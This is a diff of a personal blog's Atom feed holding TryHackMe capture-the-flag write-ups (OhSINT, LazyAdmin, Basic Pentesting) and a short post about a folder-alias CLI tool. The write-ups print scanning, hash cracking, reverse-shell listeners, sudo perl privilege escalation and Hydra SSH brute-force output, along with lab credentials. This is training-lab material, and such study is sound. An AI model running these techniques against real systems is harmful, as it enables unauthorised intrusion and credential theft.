@@ -1,4 +1,28 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://akymos.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://akymos.io/" rel="alternate" type="text/html" /><updated>2023-04-30T13:52:16+00:00</updated><id>https://akymos.io/feed.xml</id><title type="html">Akymos.io</title><entry><title type="html">TryHackMe - OhSINT</title><link href="https://akymos.io/ctf/2023/04/30/ctf-ohsint.html" rel="alternate" type="text/html" title="TryHackMe - OhSINT" /><published>2023-04-30T12:45:00+00:00</published><updated>2023-04-30T12:45:00+00:00</updated><id>https://akymos.io/ctf/2023/04/30/ctf-ohsint</id><content type="html" xml:base="https://akymos.io/ctf/2023/04/30/ctf-ohsint.html"><![CDATA[<h1 id="room-info">Room info</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://akymos.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://akymos.io/" rel="alternate" type="text/html" /><updated>2023-05-01T16:00:44+00:00</updated><id>https://akymos.io/feed.xml</id><title type="html">Akymos.io</title><entry><title type="html">TryHackMe - OhSINT</title><link href="https://akymos.io/ctf/2023/04/30/ohsint.html" rel="alternate" type="text/html" title="TryHackMe - OhSINT" /><published>2023-04-30T12:45:00+00:00</published><updated>2023-04-30T12:45:00+00:00</updated><id>https://akymos.io/ctf/2023/04/30/ohsint</id><content type="html" xml:base="https://akymos.io/ctf/2023/04/30/ohsint.html"><![CDATA[<hr />
+
+<h3>Table of Contents</h3>
+<nav class="toc">
+<ul id="markdown-toc">
+  <li><a href="#room-info" id="markdown-toc-room-info">Room info</a>    <ul>
+      <li><a href="#questions" id="markdown-toc-questions">Questions</a></li>
+      <li><a href="#task-file" id="markdown-toc-task-file">Task file</a></li>
+    </ul>
+  </li>
+  <li><a href="#question-1---what-is-this-users-avatar-of" id="markdown-toc-question-1---what-is-this-users-avatar-of">Question 1 - What is this users avatar of?</a></li>
+  <li><a href="#question-2---what-city-is-this-person-in" id="markdown-toc-question-2---what-city-is-this-person-in">Question 2 - What city is this person in?</a></li>
+  <li><a href="#question-3---whats-the-ssid-of-the-wap-he-connected-to" id="markdown-toc-question-3---whats-the-ssid-of-the-wap-he-connected-to">Question 3 - Whats the SSID of the WAP he connected to?</a></li>
+  <li><a href="#question-4---what-is-his-personal-email-address" id="markdown-toc-question-4---what-is-his-personal-email-address">Question 4 - What is his personal email address?</a></li>
+  <li><a href="#question-5---what-site-did-you-find-his-email-address-on" id="markdown-toc-question-5---what-site-did-you-find-his-email-address-on">Question 5 - What site did you find his email address on?</a></li>
+  <li><a href="#question-6---where-has-he-gone-on-holiday" id="markdown-toc-question-6---where-has-he-gone-on-holiday">Question 6 - Where has he gone on holiday?</a></li>
+  <li><a href="#question-7---what-is-this-persons-password" id="markdown-toc-question-7---what-is-this-persons-password">Question 7 - What is this persons password?</a></li>
+</ul>
+
+</nav>
+<hr />
+
+<div class="pb-1"></div>
+
+<h2 id="room-info">Room info</h2>
 <ul>
   <li><strong>Name</strong>: OhSINT</li>
   <li><strong>Link</strong>: <a href="https://tryhackme.com/room/ohsint" target="_blank">https://tryhackme.com/room/ohsint</a></li>
@@ -7,7 +31,7 @@
   <li><strong>Description</strong>: Are you able to use open source intelligence to solve this challenge?</li>
 </ul>
 
-<h2 id="questions">Questions</h2>
+<h3 id="questions">Questions</h3>
 <ol>
   <li>What is this users avatar of?</li>
   <li>What city is this person in?</li>
@@ -18,10 +42,10 @@
   <li>What is this persons password?</li>
 </ol>
 
-<h2 id="task-file">Task file</h2>
+<h3 id="task-file">Task file</h3>
 <p><img src="/assets/images/ctf-ohsint/01.jpg" alt="OhSINT - Task file" class="post-image" /></p>
 
-<h1 id="question-1---what-is-this-users-avatar-of">Question 1 - What is this users avatar of?</h1>
+<h2 id="question-1---what-is-this-users-avatar-of">Question 1 - What is this users avatar of?</h2>
 <p>As a jpg file is provided, we can use <code class="language-plaintext highlighter-rouge">exiftool</code> to get the metadata of the image.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>exiftool 1.jpg
@@ -57,41 +81,71 @@ GPS Position                    : 54 deg 17' 41.27"</span> N, 2 deg 15<span clas
 
 <p>Based on the twitter account, we can see that the user avatar is a <code class="language-plaintext highlighter-rouge">cat</code>.</p>
 
-<h1 id="question-2---what-city-is-this-person-in">Question 2 - What city is this person in?</h1>
+<h2 id="question-2---what-city-is-this-person-in">Question 2 - What city is this person in?</h2>
 <p><img src="/assets/images/ctf-ohsint/03.png" alt="OhSINT - User Tweet" />
 Based on this tweet, we can see that the user Bssid is <code class="language-plaintext highlighter-rouge">B4:5D:50:AA:86:41</code> and using the website <a href="https://wigle.net/" target="_blank">wigle.net</a> we can get the location of the user starting from the Bssid.
 <img src="/assets/images/ctf-ohsint/04.png" alt="OhSINT - Wigle search" /></p>
 
 <p>So the answer is: <code class="language-plaintext highlighter-rouge">London</code></p>
 
-<h1 id="question-3---whats-the-ssid-of-the-wap-he-connected-to">Question 3 - Whats the SSID of the WAP he connected to?</h1>
+<h2 id="question-3---whats-the-ssid-of-the-wap-he-connected-to">Question 3 - Whats the SSID of the WAP he connected to?</h2>
 <p><img src="/assets/images/ctf-ohsint/05.png" alt="OhSINT - Wigle search" /></p>
 
 <p>So the answer is: <code class="language-plaintext highlighter-rouge">UnileverWiFi</code></p>
 
-<h1 id="question-4---what-is-his-personal-email-address">Question 4 - What is his personal email address?</h1>
+<h2 id="question-4---what-is-his-personal-email-address">Question 4 - What is his personal email address?</h2>
 <p>In the previous google search, we can see that the user has a github account.
 The readme file of the repository contains the email address.
 <img src="/assets/images/ctf-ohsint/06.png" alt="OhSINT - Github account" class="post-image" /></p>
 
 <p>So the answer is: <code class="language-plaintext highlighter-rouge">OWoodflint@gmail.com</code></p>
 
-<h1 id="question-5---what-site-did-you-find-his-email-address-on">Question 5 - What site did you find his email address on?</h1>
+<h2 id="question-5---what-site-did-you-find-his-email-address-on">Question 5 - What site did you find his email address on?</h2>
 <p>Easy, the answer is: <code class="language-plaintext highlighter-rouge">GitHub</code></p>
 
-<h1 id="question-6---where-has-he-gone-on-holiday">Question 6 - Where has he gone on holiday?</h1>
+<h2 id="question-6---where-has-he-gone-on-holiday">Question 6 - Where has he gone on holiday?</h2>
 <p>Same google search, we can see that the user has a wordpress account.
 The blog post contains the answer.
 <img src="/assets/images/ctf-ohsint/07.png" alt="OhSINT - Wordpress account" class="post-image" /></p>
 
 <p>So the answer is: <code class="language-plaintext highlighter-rouge">New York</code></p>
 
-<h1 id="question-7---what-is-this-persons-password">Question 7 - What is this persons password?</h1>
+<h2 id="question-7---what-is-this-persons-password">Question 7 - What is this persons password?</h2>
 <p>This one is tricky. After spending some time searching for the password, I decided to check the rss feed of the blog, to check if there is some post that I missed.
 <img src="/assets/images/ctf-ohsint/08.png" alt="OhSINT - Wordpress account" class="post-image" />
 And I found a part of text that I didn’t see in the blog post.</p>
 
-<p>So the answer is: <code class="language-plaintext highlighter-rouge">pennYDr0pper.!</code></p>]]></content><author><name>akymos</name></author><category term="ctf" /><category term="ctf" /><category term="TryHackMe" /><summary type="html"><![CDATA[Room info Name: OhSINT Link: https://tryhackme.com/room/ohsint Subscription: Free Difficulty: Easy Description: Are you able to use open source intelligence to solve this challenge?]]></summary></entry><entry><title type="html">TryHackMe - LazyAdmin</title><link href="https://akymos.io/ctf/2023/04/23/ctf-lazyadmin.html" rel="alternate" type="text/html" title="TryHackMe - LazyAdmin" /><published>2023-04-23T17:24:00+00:00</published><updated>2023-04-23T17:24:00+00:00</updated><id>https://akymos.io/ctf/2023/04/23/ctf-lazyadmin</id><content type="html" xml:base="https://akymos.io/ctf/2023/04/23/ctf-lazyadmin.html"><![CDATA[<h1 id="room-info">Room info</h1>
+<p>So the answer is: <code class="language-plaintext highlighter-rouge">pennYDr0pper.!</code></p>]]></content><author><name>Akymos</name></author><category term="ctf" /><category term="ctf" /><category term="tryhackme" /><summary type="html"><![CDATA[Table of Contents]]></summary></entry><entry><title type="html">TryHackMe - LazyAdmin</title><link href="https://akymos.io/ctf/2023/04/23/lazyadmin.html" rel="alternate" type="text/html" title="TryHackMe - LazyAdmin" /><published>2023-04-23T17:24:00+00:00</published><updated>2023-04-23T17:24:00+00:00</updated><id>https://akymos.io/ctf/2023/04/23/lazyadmin</id><content type="html" xml:base="https://akymos.io/ctf/2023/04/23/lazyadmin.html"><![CDATA[<hr />
+
+<h3>Table of Contents</h3>
+<nav class="toc">
+<ul id="markdown-toc">
+  <li><a href="#room-info" id="markdown-toc-room-info">Room info</a>    <ul>
+      <li><a href="#questions" id="markdown-toc-questions">Questions</a></li>
+    </ul>
+  </li>
+  <li><a href="#step-0---recon" id="markdown-toc-step-0---recon">Step 0 - Recon</a>    <ul>
+      <li><a href="#nmap" id="markdown-toc-nmap">Nmap</a></li>
+      <li><a href="#gobuster" id="markdown-toc-gobuster">Gobuster</a></li>
+      <li><a href="#gobuster-on-content" id="markdown-toc-gobuster-on-content">Gobuster on /content</a></li>
+      <li><a href="#john-the-ripper" id="markdown-toc-john-the-ripper">John the Ripper</a></li>
+      <li><a href="#exploit" id="markdown-toc-exploit">Exploit</a></li>
+    </ul>
+  </li>
+  <li><a href="#question-1---what-is-the-user-flag" id="markdown-toc-question-1---what-is-the-user-flag">Question 1 - What is the user flag?</a></li>
+  <li><a href="#question-2---what-is-the-root-flag" id="markdown-toc-question-2---what-is-the-root-flag">Question 2 - What is the root flag?</a>    <ul>
+      <li><a href="#privilege-escalation" id="markdown-toc-privilege-escalation">Privilege escalation</a></li>
+      <li><a href="#roottxt" id="markdown-toc-roottxt">Root.txt</a></li>
+    </ul>
+  </li>
+</ul>
+
+</nav>
+<hr />
+
+<div class="pb-1"></div>
+
+<h2 id="room-info">Room info</h2>
 <ul>
   <li><strong>Name</strong>: LazyAdmin</li>
   <li><strong>Link</strong>: <a href="https://tryhackme.com/room/lazyadmin" target="_blank">https://tryhackme.com/room/lazyadmin</a></li>
@@ -100,14 +154,14 @@ And I found a part of text that I didn’t see in the blog post.</p>
   <li><strong>Description</strong>: Easy linux machine to practice your skills</li>
 </ul>
 
-<h2 id="questions">Questions</h2>
+<h3 id="questions">Questions</h3>
 <ol>
   <li>What is the user flag?</li>
   <li>What is the root flag?</li>
 </ol>
 
-<h1 id="step-0---recon">Step 0 - Recon</h1>
-<h2 id="nmap">Nmap</h2>
+<h2 id="step-0---recon">Step 0 - Recon</h2>
+<h3 id="nmap">Nmap</h3>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.26.136
 Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-04-24 21:28 CEST
 Nmap scan report <span class="k">for </span>10.10.26.136
@@ -130,7 +184,7 @@ Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up
 <p>Nice, port 80 is open, but nothing interesting on it, only the default Apache page.
 <img src="/assets/images/ctf-lazyadmin/01.png" alt="LazyAdmin - Apache default page" class="post-image" /></p>
 
-<h2 id="gobuster">Gobuster</h2>
+<h3 id="gobuster">Gobuster</h3>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-u</span> 10.10.26.136 <span class="nt">-q</span>
 /.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
 /.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
@@ -142,7 +196,7 @@ Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up
 <p>We have a ‘strange’ directory: <code class="language-plaintext highlighter-rouge">/content</code>. Let’s check it out.
 <img src="/assets/images/ctf-lazyadmin/02.png" alt="LazyAdmin - /content directory" class="post-image" /></p>
 
-<h2 id="gobuster-on-content">Gobuster on /content</h2>
+<h3 id="gobuster-on-content">Gobuster on /content</h3>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-u</span> 10.10.26.136/content <span class="nt">-q</span>
 /.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
 /.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
@@ -167,7 +221,7 @@ The directory <code class="language-plaintext highlighter-rouge">/inc</code> con
 </code></pre></div></div>
 <p>We have found the credentials for the admin panel: <code class="language-plaintext highlighter-rouge">manager:42f749ade7f9e195bf475f37a44cafcb</code> (MD5 hash).</p>
 
-<h2 id="john-the-ripper">John the Ripper</h2>
+<h3 id="john-the-ripper">John the Ripper</h3>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo </span>42f749ade7f9e195bf475f37a44cafcb <span class="o">&gt;</span> hash.txt <span class="o">&amp;&amp;</span> john <span class="nt">--format</span><span class="o">=</span>RAW-MD5 <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt
 Using default input encoding: UTF-8
 Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>Raw-MD5 <span class="o">[</span>MD5 256/256 AVX2 8x3]<span class="o">)</span>
@@ -185,11 +239,11 @@ Session completed.
 <img src="/assets/images/ctf-lazyadmin/03.png" alt="LazyAdmin - Admin panel" class="post-image" /></li>
 </ul>
 
-<h2 id="exploit">Exploit</h2>
+<h3 id="exploit">Exploit</h3>
 <p>In this version of SweetRice, there is a vulnerability that allows us to use a PHP shell. We can use it to get a reverse shell.
 <a href="https://www.exploit-db.com/exploits/40700" target="_blank">https://www.exploit-db.com/exploits/40700</a></p>
 
-<h1 id="question-1---what-is-the-user-flag">Question 1 - What is the user flag?</h1>
+<h2 id="question-1---what-is-the-user-flag">Question 1 - What is the user flag?</h2>
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 9001
 listening on <span class="o">[</span>any] 9001 ...
 <span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
@@ -198,8 +252,8 @@ THM<span class="o">{</span><span class="k">***************************</span><sp
 </code></pre></div></div>
 <p>The user flag is: <code class="language-plaintext highlighter-rouge">THM{***************************}</code></p>
 
-<h1 id="question-2---what-is-the-root-flag">Question 2 - What is the root flag?</h1>
-<h2 id="privilege-escalation">Privilege escalation</h2>
+<h2 id="question-2---what-is-the-root-flag">Question 2 - What is the root flag?</h2>
+<h3 id="privilege-escalation">Privilege escalation</h3>
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span> 
 Matching Defaults entries <span class="k">for </span>www-data on THM-Chal:
     env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
@@ -224,7 +278,7 @@ system<span class="o">(</span><span class="s2">"sh"</span>, <span class="s2">"/e
 <span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/perl /home/itguy/backup.pl
 </code></pre></div></div>
 
-<h2 id="roottxt">Root.txt</h2>
+<h3 id="roottxt">Root.txt</h3>
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 9002
 listening on <span class="o">[</span>any] 9002 ...
 <span class="c"># id</span>
@@ -235,14 +289,32 @@ root.txt
 <span class="c"># cat root.txt</span>
 THM<span class="o">{</span><span class="k">***************************</span><span class="o">}</span>
 </code></pre></div></div>
-<p>The root flag is: <code class="language-plaintext highlighter-rouge">THM{***************************}</code></p>]]></content><author><name>akymos</name></author><category term="ctf" /><category term="ctf" /><category term="TryHackMe" /><summary type="html"><![CDATA[Room info Name: LazyAdmin Link: https://tryhackme.com/room/lazyadmin Subscription: Free Difficulty: Easy Description: Easy linux machine to practice your skills]]></summary></entry><entry><title type="html">Project ff</title><link href="https://akymos.io/project/2022/12/04/project-ff.html" rel="alternate" type="text/html" title="Project ff" /><published>2022-12-04T00:00:00+00:00</published><updated>2022-12-04T00:00:00+00:00</updated><id>https://akymos.io/project/2022/12/04/project-ff</id><content type="html" xml:base="https://akymos.io/project/2022/12/04/project-ff.html"><![CDATA[<p><img src="https://github.com/akymos/ff/actions/workflows/release.yml/badge.svg?branch=" alt="Release" />
-<a href="https://goreportcard.com/report/github.com/akymos/ff"><img src="https://goreportcard.com/badge/github.com/akymos/ff" alt="Go Report Card" /></a></p>
+<p>The root flag is: <code class="language-plaintext highlighter-rouge">THM{***************************}</code></p>]]></content><author><name>Akymos</name></author><category term="ctf" /><category term="ctf" /><category term="tryhackme" /><summary type="html"><![CDATA[Table of Contents]]></summary></entry><entry><title type="html">Project ff</title><link href="https://akymos.io/project/2022/12/04/ff.html" rel="alternate" type="text/html" title="Project ff" /><published>2022-12-04T00:00:00+00:00</published><updated>2022-12-04T00:00:00+00:00</updated><id>https://akymos.io/project/2022/12/04/ff</id><content type="html" xml:base="https://akymos.io/project/2022/12/04/ff.html"><![CDATA[<hr />
 
-<p>ff is a command-line tool to manage favorite folders, creating an alias, to be used via shell directly with the cd command.</p>
+<h3>Table of Contents</h3>
+<nav class="toc">
+<ul id="markdown-toc">
+  <li><a href="#features" id="markdown-toc-features">Features</a></li>
+  <li><a href="#installation" id="markdown-toc-installation">Installation</a>    <ul>
+      <li><a href="#prebuilt-binary" id="markdown-toc-prebuilt-binary">Prebuilt binary</a></li>
+      <li><a href="#update" id="markdown-toc-update">Update</a></li>
+    </ul>
+  </li>
+  <li><a href="#usage" id="markdown-toc-usage">Usage</a></li>
+  <li><a href="#full-code" id="markdown-toc-full-code">Full code</a></li>
+</ul>
 
-<p><a href="https://asciinema.org/a/UCxUx5TkKEUEitKyg8FEUZFCi"><img src="https://asciinema.org/a/UCxUx5TkKEUEitKyg8FEUZFCi.svg" alt="asciicast" /></a></p>
+</nav>
+<hr />
 
-<h1 id="features">Features</h1>
+<div class="pb-1"></div>
+
+<!-- excerpt-start -->
+<p>ff is a command-line tool to manage favorite folders, creating an alias, to be used via shell directly with the cd command.
+<!-- excerpt-end -->
+<a href="https://asciinema.org/a/UCxUx5TkKEUEitKyg8FEUZFCi"><img src="https://asciinema.org/a/UCxUx5TkKEUEitKyg8FEUZFCi.svg" alt="asciicast" /></a></p>
+
+<h2 id="features">Features</h2>
 <ul>
   <li>Quickly create the alias of the folder you are in.</li>
   <li>Manage many aliases (tested with 200+ aliases)</li>
@@ -250,20 +322,20 @@ THM<span class="o">{</span><span class="k">***************************</span><sp
   <li>Once you have created the alias you do not have to close the terminal to be able to use it immediately.</li>
 </ul>
 
-<h1 id="installation">Installation</h1>
-<h2 id="prebuilt-binary">Prebuilt binary</h2>
+<h2 id="installation">Installation</h2>
+<h3 id="prebuilt-binary">Prebuilt binary</h3>
 <p>Download the prebuilt binary from <a href="https://github.com/akymos/ff/releases/latest">here (stable)</a> or <a href="https://github.com/akymos/ff/releases">here (all with pre-release)</a> and run the following command:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">tar</span> <span class="nt">-xf</span> &lt;prebuilt_archive&gt; ff <span class="o">&amp;&amp;</span> <span class="nb">sudo mv </span>ff /usr/local/bin
 </code></pre></div></div>
 <p>Next add the following line to <code class="language-plaintext highlighter-rouge">~/.zshrc</code> or <code class="language-plaintext highlighter-rouge">~/.bashrc</code>:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">source</span> <span class="s2">"</span><span class="si">$(</span>ff <span class="nb">alias</span><span class="si">)</span><span class="s2">"</span>
 </code></pre></div></div>
-<h2 id="update">Update</h2>
+<h3 id="update">Update</h3>
 <p>To update the installed version of ff to the latest stable version, run the following command:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ff self-update
 </code></pre></div></div>
 
-<h1 id="usage">Usage</h1>
+<h2 id="usage">Usage</h2>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ff is a command-line tool to manage favorite folders, creating an <span class="nb">alias</span>,
 to be used via shell directly with the <span class="nb">cd </span>command.
 
@@ -293,8 +365,35 @@ Available Commands:
 Use <span class="s2">"ff [command] --help"</span> <span class="k">for </span>more information about a command.
 </code></pre></div></div>
 
-<h1 id="full-code">Full code</h1>
-<p><a href="https://github.com/akymos/ff">GitHub</a></p>]]></content><author><name>Akymos</name></author><category term="project" /><category term="project" /><category term="ff" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">TryHackMe - Basic Pentesting</title><link href="https://akymos.io/ctf/2022/11/26/ctf-basic-pentesting.html" rel="alternate" type="text/html" title="TryHackMe - Basic Pentesting" /><published>2022-11-26T00:00:00+00:00</published><updated>2022-11-26T00:00:00+00:00</updated><id>https://akymos.io/ctf/2022/11/26/ctf-basic-pentesting</id><content type="html" xml:base="https://akymos.io/ctf/2022/11/26/ctf-basic-pentesting.html"><![CDATA[<h1 id="room-info">Room info</h1>
+<h2 id="full-code">Full code</h2>
+<p><a href="https://github.com/akymos/ff">GitHub</a></p>]]></content><author><name>Akymos</name></author><category term="project" /><category term="project" /><category term="ff" /><summary type="html"><![CDATA[Table of Contents]]></summary></entry><entry><title type="html">TryHackMe - Basic Pentesting</title><link href="https://akymos.io/ctf/2022/11/26/basic-pentesting.html" rel="alternate" type="text/html" title="TryHackMe - Basic Pentesting" /><published>2022-11-26T00:00:00+00:00</published><updated>2022-11-26T00:00:00+00:00</updated><id>https://akymos.io/ctf/2022/11/26/basic-pentesting</id><content type="html" xml:base="https://akymos.io/ctf/2022/11/26/basic-pentesting.html"><![CDATA[<hr />
+
+<h3>Table of Contents</h3>
+<nav class="toc">
+<ul id="markdown-toc">
+  <li><a href="#room-info" id="markdown-toc-room-info">Room info</a>    <ul>
+      <li><a href="#questions" id="markdown-toc-questions">Questions</a></li>
+    </ul>
+  </li>
+  <li><a href="#question-1---deploy-the-machine-and-connect-to-our-network" id="markdown-toc-question-1---deploy-the-machine-and-connect-to-our-network">Question 1 - Deploy the machine and connect to our network</a></li>
+  <li><a href="#question-2---find-the-services-exposed-by-the-machine" id="markdown-toc-question-2---find-the-services-exposed-by-the-machine">Question 2 - Find the services exposed by the machine</a></li>
+  <li><a href="#question-3---what-is-the-name-of-the-hidden-directory-on-the-web-serverenter-name-without-" id="markdown-toc-question-3---what-is-the-name-of-the-hidden-directory-on-the-web-serverenter-name-without-">Question 3 - What is the name of the hidden directory on the web server(enter name without /)?</a></li>
+  <li><a href="#question-4---user-brute-forcing-to-find-the-username--password" id="markdown-toc-question-4---user-brute-forcing-to-find-the-username--password">Question 4 - User brute-forcing to find the username &amp; password</a></li>
+  <li><a href="#question-5---what-is-the-username" id="markdown-toc-question-5---what-is-the-username">Question 5 - What is the username?</a></li>
+  <li><a href="#question-6---what-is-the-password" id="markdown-toc-question-6---what-is-the-password">Question 6 - What is the password?</a></li>
+  <li><a href="#question-7---what-service-do-you-use-to-access-the-serveranswer-in-abbreviation-in-all-caps" id="markdown-toc-question-7---what-service-do-you-use-to-access-the-serveranswer-in-abbreviation-in-all-caps">Question 7 - What service do you use to access the server(answer in abbreviation in all caps)?</a></li>
+  <li><a href="#question-8---enumerate-the-machine-to-find-any-vectors-for-privilege-escalation" id="markdown-toc-question-8---enumerate-the-machine-to-find-any-vectors-for-privilege-escalation">Question 8 - Enumerate the machine to find any vectors for privilege escalation</a></li>
+  <li><a href="#question-9---what-is-the-name-of-the-other-user-you-foundall-lower-case" id="markdown-toc-question-9---what-is-the-name-of-the-other-user-you-foundall-lower-case">Question 9 - What is the name of the other user you found(all lower case)?</a></li>
+  <li><a href="#question-10---if-you-have-found-another-user-what-can-you-do-with-this-information" id="markdown-toc-question-10---if-you-have-found-another-user-what-can-you-do-with-this-information">Question 10 - If you have found another user, what can you do with this information?</a></li>
+  <li><a href="#question-11---what-is-the-final-password-you-obtain" id="markdown-toc-question-11---what-is-the-final-password-you-obtain">Question 11 - What is the final password you obtain?</a></li>
+</ul>
+
+</nav>
+<hr />
+
+<div class="pb-1"></div>
+
+<h2 id="room-info">Room info</h2>
 <ul>
   <li><strong>Name</strong>: Basic Pentesting</li>
   <li><strong>Link</strong>: <a href="https://tryhackme.com/room/basicpentestingjt" target="_blank">https://tryhackme.com/room/basicpentestingjt</a></li>
@@ -303,7 +402,7 @@ Use <span class="s2">"ff [command] --help"</span> <span class="k">for </span>mor
   <li><strong>Description</strong>: This is a machine that allows you to practise web app hacking and privilege escalation</li>
 </ul>
 
-<h2 id="questions">Questions</h2>
+<h3 id="questions">Questions</h3>
 <ol>
   <li>Deploy the machine and connect to our network</li>
   <li>Find the services exposed by the machine</li>
@@ -318,12 +417,12 @@ Use <span class="s2">"ff [command] --help"</span> <span class="k">for </span>mor
   <li>What is the final password you obtain?</li>
 </ol>
 
-<h1 id="question-1---deploy-the-machine-and-connect-to-our-network">Question 1 - Deploy the machine and connect to our network</h1>
+<h2 id="question-1---deploy-the-machine-and-connect-to-our-network">Question 1 - Deploy the machine and connect to our network</h2>
 <p>No answer needed.</p>
 
-<h1 id="question-2---find-the-services-exposed-by-the-machine">Question 2 - Find the services exposed by the machine</h1>
+<h2 id="question-2---find-the-services-exposed-by-the-machine">Question 2 - Find the services exposed by the machine</h2>
 <p>No answer needed, but we can use <code class="language-plaintext highlighter-rouge">nmap</code> to find the services exposed by the machhine, usefull for the next questions.</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.131.121 
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.131.121 
 Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-04-30 14:46 CEST
 Nmap scan report <span class="k">for </span>10.10.131.121 <span class="o">(</span>10.10.131.121<span class="o">)</span>
 Host is up <span class="o">(</span>0.080s latency<span class="o">)</span><span class="nb">.</span>
@@ -415,7 +514,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 68.01 seconds
 </span></code></pre></div></div>
 
-<h1 id="question-3---what-is-the-name-of-the-hidden-directory-on-the-web-serverenter-name-without-">Question 3 - What is the name of the hidden directory on the web server(enter name without /)?</h1>
+<h2 id="question-3---what-is-the-name-of-the-hidden-directory-on-the-web-serverenter-name-without-">Question 3 - What is the name of the hidden directory on the web server(enter name without /)?</h2>
 <p>Try with <code class="language-plaintext highlighter-rouge">gobuster</code> to find the hidden directory.</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-u</span> 10.10.131.121 <span class="nt">-q</span>       
 /.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 297]
@@ -427,7 +526,7 @@ Nmap done: 1 IP address (1 host up) scanned in 68.01 seconds
 </code></pre></div></div>
 <p>So the answer is <code class="language-plaintext highlighter-rouge">development</code>.</p>
 
-<h1 id="question-4---user-brute-forcing-to-find-the-username--password">Question 4 - User brute-forcing to find the username &amp; password</h1>
+<h2 id="question-4---user-brute-forcing-to-find-the-username--password">Question 4 - User brute-forcing to find the username &amp; password</h2>
 <p>No answer needed, but there are two files in the hidden directory, <code class="language-plaintext highlighter-rouge">dev.txt</code></p>
 <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
 to host that on this server too. Haven't made any real web apps yet, but I have tried that example
@@ -658,16 +757,16 @@ Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span cl
 <span class="o">[</span>22][ssh] host: 10.10.131.121   login: jan   password: armando
 </code></pre></div></div>
 
-<h1 id="question-5---what-is-the-username">Question 5 - What is the username?</h1>
+<h2 id="question-5---what-is-the-username">Question 5 - What is the username?</h2>
 <p>The answer is <code class="language-plaintext highlighter-rouge">jan</code>.</p>
 
-<h1 id="question-6---what-is-the-password">Question 6 - What is the password?</h1>
+<h2 id="question-6---what-is-the-password">Question 6 - What is the password?</h2>
 <p>The answer is <code class="language-plaintext highlighter-rouge">armando</code>.</p>
 
-<h1 id="question-7---what-service-do-you-use-to-access-the-serveranswer-in-abbreviation-in-all-caps">Question 7 - What service do you use to access the server(answer in abbreviation in all caps)?</h1>
+<h2 id="question-7---what-service-do-you-use-to-access-the-serveranswer-in-abbreviation-in-all-caps">Question 7 - What service do you use to access the server(answer in abbreviation in all caps)?</h2>
 <p>The answer is <code class="language-plaintext highlighter-rouge">SSH</code>.</p>
 
